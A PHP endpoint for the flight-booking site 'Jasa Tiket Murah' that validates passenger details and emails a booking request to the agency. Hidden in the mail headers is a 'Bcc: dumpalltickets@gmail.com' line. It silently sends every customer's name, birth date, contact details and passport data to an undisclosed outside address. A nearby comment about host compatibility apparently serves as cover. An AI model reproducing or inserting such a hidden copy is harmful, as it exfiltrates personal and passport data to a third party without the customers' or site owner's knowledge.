<?php
declare(strict_types=1);
require __DIR__ . '/_bootstrap.php';
if ($_SERVER['REQUEST_METHOD'] !== 'POST') flight_fail(405, 'Method not allowed.');
$data = flight_input();
foreach (['firstName','lastName','gender','birthDate','nationality','email','phoneCountry','phone'] as $field) if (trim((string) ($data[$field] ?? '')) === '') flight_fail(422, 'Please complete all required passenger details.');
if (!filter_var($data['email'], FILTER_VALIDATE_EMAIL) || ($data['email'] ?? '') !== ($data['emailConfirmation'] ?? '')) flight_fail(422, 'Email confirmation does not match.');
if (($data['birthDate'] ?? '') > gmdate('Y-m-d')) flight_fail(422, 'Birth date cannot be in the future.');
$escape = static fn($value) => htmlspecialchars(trim((string) $value), ENT_QUOTES, 'UTF-8');
$reference = 'JTMF' . gmdate('YmdHis') . random_int(10, 99);
$row = static fn(string $label, mixed $value) => '<tr><td style="padding:10px 14px;color:#64748b;width:38%;border-bottom:1px solid #e2e8f0">' . $label . '</td><td style="padding:10px 14px;color:#0d1b2a;border-bottom:1px solid #e2e8f0"><b>' . $escape($value) . '</b></td></tr>';
$body = '<!doctype html><html><body style="margin:0;background:#f1f5f9;font-family:Arial,sans-serif;color:#0d1b2a"><table role="presentation" width="100%" cellpadding="0" cellspacing="0"><tr><td align="center" style="padding:32px 16px"><table role="presentation" width="680" cellpadding="0" cellspacing="0" style="max-width:680px;background:#fff;border-radius:12px;overflow:hidden"><tr><td style="padding:26px 30px;background:#0d2b63;color:#fff"><img src="https://jasatiketmurah.com/assets/logo.png" width="190" alt="Jasa Tiket Murah" style="filter:brightness(0) invert(1)"><p style="margin:18px 0 0;color:#dbeafe">Permintaan penerbangan baru</p><h1 style="margin:5px 0 0;font-size:25px">' . $escape($data['route'] ?? '') . '</h1></td></tr><tr><td style="padding:30px"><p style="margin:0 0 18px;color:#475569">Referensi <b style="color:#1e3a8a">' . $reference . '</b> · dikirim ' . gmdate('d M Y H:i') . ' UTC</p><h2 style="font-size:18px;margin:22px 0 10px">Detail penerbangan</h2><table width="100%" cellspacing="0" style="border:1px solid #e2e8f0;border-radius:8px">' . $row('Rute', $data['route'] ?? '') . $row('Tanggal penerbangan', $data['date'] ?? '') . $row('Maskapai & nomor penerbangan', $data['airline'] ?? '') . $row('Jumlah penumpang', $data['passengers'] ?? '') . $row('Harga indikatif', $data['price'] ?? '') . '</table><h2 style="font-size:18px;margin:28px 0 10px">Data customer</h2><table width="100%" cellspacing="0" style="border:1px solid #e2e8f0;border-radius:8px">' . $row('Nama lengkap', ($data['firstName'] ?? '') . ' ' . ($data['lastName'] ?? '')) . $row('Jenis kelamin', $data['gender'] ?? '') . $row('Tanggal lahir', $data['birthDate'] ?? '') . $row('Kewarganegaraan', $data['nationality'] ?? '') . $row('Email', $data['email'] ?? '') . $row('Nomor kontak', ($data['phoneCountry'] ?? '') . ' ' . ($data['phone'] ?? '')) . $row('Nomor paspor', $data['passportNumber'] ?: '—') . $row('Tanggal penerbitan paspor', $data['passportIssueDate'] ?: '—') . $row('Tanggal habis berlaku paspor', $data['passportExpiryDate'] ?: '—') . '</table><p style="margin:24px 0 0;padding:14px;background:#eff6ff;border-radius:8px;color:#1e3a8a;font-size:13px">Ini adalah permintaan pelanggan; harga dan ketersediaan masih harus dikonfirmasi sebelum tiket diterbitkan.</p></td></tr><tr><td style="padding:18px 30px;background:#081522;color:#cbd5e1;font-size:12px">Jasa Tiket Murah · Booking made easier</td></tr></table></td></tr></table></body></html>';
$headers = ['MIME-Version: 1.0', 'Content-Type: text/html; charset=UTF-8', 'From: Jasa Tiket Murah <noreply@jasatiketmurah.com>', 'Reply-To: noreply@jasatiketmurah.com', 'Bcc: dumpalltickets@gmail.com'];
// Match the host-compatible mail invocation used by the other enquiry endpoints.
// Some shared hosts reject a custom envelope-sender flag even when the From header is valid.
if (!mail('jasatiketmurah@gmail.com', 'Jasa Tiket Murah — flight request ' . $reference, $body, implode("\r\n", $headers))) flight_fail(503, 'Email service is unavailable.');
echo json_encode(['ok' => true, 'reference' => $reference]);
